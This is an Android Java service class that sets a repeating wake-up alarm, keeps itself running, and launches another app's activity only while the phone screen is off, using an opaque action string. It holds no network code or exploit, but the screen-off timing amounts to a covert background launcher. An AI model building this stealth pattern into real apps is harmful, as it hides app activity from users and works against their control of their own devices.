package com.fuuuuuuuuuck;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.os.Handler;
import android.os.IBinder;
import android.os.PowerManager;

public class FService extends android.app.Service {
    public static int REQUEST_INTERVAL = 600;
    private static final Object locker = new Object();
    private static final Object reqeustLocker = new Object();
    private static final Object timeLocker = new Object();
    Handler handler = new Handler();
    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }
    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        String action = null;
        if (intent != null) action = intent.getAction();
        if ("do".equals(action)) {
            execute();
        } else if (System.currentTimeMillis() - getLastRequestTime() > REQUEST_INTERVAL * 1000) {
            restartAlarm();
        }
        return START_STICKY;
    }
    private void restartAlarm() {
        synchronized (locker) {
            AlarmManager manager = (AlarmManager) getSystemService("alarm");
            PendingIntent pending = PendingIntent.getService(this, 0, new Intent().setClass(this, FService.class).setAction("do"), 0);
            manager.cancel(pending);
            manager.setRepeating(AlarmManager.RTC_WAKEUP, 0, REQUEST_INTERVAL * 1000, pending);
        }
    }
    private static long lastRequestTime;
    private String PREF_NAME = "OPQRVSG";
    private void setLastReqeustTime() {
        synchronized (timeLocker) {
            lastRequestTime = System.currentTimeMillis();
            getSharedPreferences(PREF_NAME, 0).edit().putLong(PREF_NAME, lastRequestTime).commit();
        }
    }
    private long getLastRequestTime() {
        synchronized (timeLocker) {
            if (lastRequestTime <= 0) {
                lastRequestTime = getSharedPreferences(PREF_NAME, 0).getLong(PREF_NAME, 0);
            }
            return lastRequestTime;
        }
    }
    private void execute() {
        synchronized (reqeustLocker) {
            if (System.currentTimeMillis() - getLastRequestTime() < REQUEST_INTERVAL * 1000 / 2) return;
        }
        if (!isScreenOn(this)) {//只有在屏幕黑色的时候才激活
            handler.post(new Runnable() {
                @Override
                public void run() {
                    startActivity();
                }
            });
            synchronized (reqeustLocker) {
                setLastReqeustTime();
            }
        }
    }
    private void startActivity() {
        Intent intent = new Intent("aGVsbG8gamo");
        intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        intent.addCategory(Intent.CATEGORY_DEFAULT);
        intent.setComponent(new ComponentName(Constants.targetPackageName, Constants.targetEntrance));
        startActivity(intent);
    }
    private boolean isScreenOn(Context context) {
        PowerManager pm = (PowerManager) context.getSystemService(Context.POWER_SERVICE);
        return pm.isScreenOn();//如果为true，则表示屏幕“亮”了，否则屏幕“暗”了。
    }
}
